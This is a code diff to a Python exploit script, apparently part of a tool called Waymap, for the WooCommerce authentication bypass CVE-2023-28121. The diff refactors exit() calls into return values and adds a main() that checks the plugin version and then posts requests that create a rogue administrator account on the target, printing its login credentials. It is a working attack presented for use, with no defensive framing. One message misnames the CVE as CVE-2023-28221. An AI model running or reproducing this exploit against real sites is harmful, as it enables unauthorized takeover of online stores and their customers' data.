@@ -20,13 +20,14 @@ def verify_woocommerce_version(profile_url):
         version = re.search(r"Stable tag: (.*)", r.text).groups()[0]
     except Exception as e:
         print(Fore.RED + f'Error... {e}')
-        exit()
+        return False 
 
     if int(version.replace('.', '')) < 562:
         print(Fore.GREEN + f'{version} Is Vulnerable To CVE-2023-28121 Trying To Create Admin')
+        return True  
     else:
         print(Fore.RED + f'{version} - Not vulnerable To CVE-2023-28221')
-        exit()
+        return False
 
 def create_waymap_admin(profile_url):
     headers = {
@@ -49,7 +50,7 @@ def create_waymap_admin(profile_url):
         print(Fore.GREEN + f'done')
     except Exception as e:
         print(Fore.RED + f'Error... {e}')
-        exit()
+        return False 
 
     print(Style.RESET_ALL + "Adding Waymap admin user:", end=' ')
     r = s.post(f'{profile_url}', data=data, headers=headers, verify=False)
@@ -57,9 +58,14 @@ def create_waymap_admin(profile_url):
         print(Fore.GREEN + f'done')
     else:
         print(Fore.RED + f'Cannot Create Waymap Admin Looks Like Target Is Not Vulnerable {r.status_code}')
-        exit()
+        return False 
 
     print(Style.RESET_ALL + "Success! You can now log in with the following credentials:")
     print(f'Username: {username}')
     print(f'Password: {password}')
     print()
+    return True 
+
+def main(profile_url):
+    if verify_woocommerce_version(profile_url):
+        create_waymap_admin(profile_url)
